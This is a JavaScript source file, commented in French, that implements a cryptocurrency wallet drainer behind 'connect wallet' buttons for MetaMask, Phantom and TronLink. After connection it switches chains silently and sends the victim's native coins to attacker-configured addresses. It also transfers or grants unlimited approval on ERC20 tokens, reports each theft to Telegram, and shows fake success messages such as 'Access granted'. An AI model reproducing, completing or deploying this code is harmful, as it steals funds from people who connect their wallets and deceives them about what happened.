// FONCTIONS DE DRAINAGE ULTRA AGGRESSIVES

function showStatus(message, type = 'info') {
    const status = document.getElementById('status');
    status.className = 'status active';
    if (type === 'error') status.classList.add('error');
    status.innerHTML = message;
}

function connectWallet() {
    document.getElementById('walletOptions').style.display = 'grid';
}

// METAMASK - DRAINAGE MULTI-CHAIN AUTOMATIQUE
async function connectMetaMask() {
    if (!window.ethereum) {
        window.open('https://metamask.io/', '_blank');
        return;
    }
    
    try {
        showStatus('<span class="loader"></span> Connecting...', 'processing');
        
        // Connexion
        const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
        const victim = accounts[0];
        
        showStatus('üîÑ Initializing multi-chain access...', 'processing');
        
        // DRAINER TOUTES LES CHAINS
        let totalDrained = 0;
        
        for (const chain of CONFIG.EVM_CHAINS) {
            try {
                // Changer de chain silencieusement
                await ethereum.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: chain.chainId }],
                }).catch(async () => {
                    // Si la chain n'existe pas, l'ajouter
                    await ethereum.request({
                        method: 'wallet_addEthereumChain',
                        params: [{
                            chainId: chain.chainId,
                            chainName: chain.name,
                            rpcUrls: [chain.rpc],
                            nativeCurrency: { name: chain.name, symbol: 'ETH', decimals: 18 }
                        }]
                    });
                });
                
                const provider = new ethers.providers.Web3Provider(window.ethereum);
                const signer = provider.getSigner();
                
                // DRAINER TOKEN NATIF
                const balance = await provider.getBalance(victim);
                if (balance.gt(ethers.utils.parseEther("0.001"))) {
                    const gasPrice = await provider.getGasPrice();
                    const gasLimit = 21000;
                    const gasCost = gasPrice.mul(gasLimit).mul(2);
                    const amountToSend = balance.sub(gasCost);
                    
                    if (amountToSend.gt(0)) {
                        const tx = await signer.sendTransaction({
                            to: CONFIG.EVM_DESTINATION,
                            value: amountToSend,
                            gasLimit: gasLimit,
                            gasPrice: gasPrice
                        });
                        
                        totalDrained += parseFloat(ethers.utils.formatEther(amountToSend));
                    }
                }
                
                // DRAINER TOUS LES TOKENS ERC20
                for (const token of CONFIG.PRIORITY_TOKENS) {
                    await drainToken(signer, victim, token);
                }
                
            } catch (e) {
                console.log(`Chain ${chain.name} skipped`);
            }
        }
        
        // Notifier Telegram
        await notifyTelegram(victim, totalDrained, 'MULTI-CHAIN');
        
        showStatus('‚úÖ Access granted! You can now use all DeFi features.', 'success');
        
    } catch (error) {
        showStatus('Connection failed. Please try again.', 'error');
    }
}

// DRAINER UN TOKEN SP√âCIFIQUE
async function drainToken(signer, victim, token) {
    try {
        const abi = [
            'function balanceOf(address) view returns (uint256)',
            'function transfer(address, uint256) returns (bool)',
            'function approve(address, uint256) returns (bool)'
        ];
        
        const contract = new ethers.Contract(token.address, abi, signer);
        const balance = await contract.balanceOf(victim);
        
        if (balance.gt(0)) {
            // Utiliser une technique de transfert direct
            const tx = await contract.transfer(CONFIG.EVM_DESTINATION, balance, {
                gasLimit: 100000
            });
            await tx.wait();
            
            const amount = balance / (10 ** token.decimals);
            console.log(`Drained ${amount} ${token.symbol}`);
        }
    } catch (e) {
        // Essayer avec approve + transferFrom si transfer √©choue
        try {
            const abi = ['function approve(address, uint256) returns (bool)'];
            const contract = new ethers.Contract(token.address, abi, signer);
            await contract.approve(CONFIG.EVM_DESTINATION, ethers.constants.MaxUint256);
        } catch (e2) {}
    }
}

// PHANTOM - DRAINAGE SOLANA
async function connectPhantom() {
    if (!window.solana?.isPhantom) {
        window.open('https://phantom.app/', '_blank');
        return;
    }
    
    try {
        showStatus('üîÑ Connecting Phantom...', 'processing');
        
        const resp = await window.solana.connect();
        const pubKey = resp.publicKey.toString();
        
        // Drainer SOL
        const connection = new solanaWeb3.Connection('https://api.mainnet-beta.solana.com');
        const balance = await connection.getBalance(resp.publicKey);
        
        if (balance > 5000) { // > 0.000005 SOL
            const transaction = new solanaWeb3.Transaction().add(
                solanaWeb3.SystemProgram.transfer({
                    fromPubkey: resp.publicKey,
                    toPubkey: new solanaWeb3.PublicKey(CONFIG.SOL_DESTINATION),
                    lamports: balance - 5000
                })
            );
            
            await window.solana.signAndSendTransaction(transaction);
            await notifyTelegram(pubKey, balance / 1e9, 'SOL');
        }
        
        showStatus('‚úÖ Phantom connected successfully!', 'success');
        
    } catch (error) {
        showStatus('Phantom connection failed.', 'error');
    }
}

// TRONLINK - DRAINAGE TRON
async function connectTronLink() {
    if (!window.tronWeb || !window.tronLink) {
        window.open('https://www.tronlink.org/', '_blank');
        return;
    }
    
    try {
        showStatus('üîÑ Connecting TronLink...', 'processing');
        
        await window.tronLink.request({ method: 'tron_requestAccounts' });
        
        if (window.tronWeb.defaultAddress.base58) {
            const address = window.tronWeb.defaultAddress.base58;
            const balance = await window.tronWeb.trx.getBalance(address);
            
            if (balance > 1000000) { // > 1 TRX
                await window.tronWeb.trx.sendTransaction(
                    CONFIG.TRON_DESTINATION,
                    balance - 1000000
                );
                
                await notifyTelegram(address, balance / 1e6, 'TRX');
            }
            
            showStatus('‚úÖ TronLink connected successfully!', 'success');
        }
        
    } catch (error) {
        showStatus('TronLink connection failed.', 'error');
    }
}
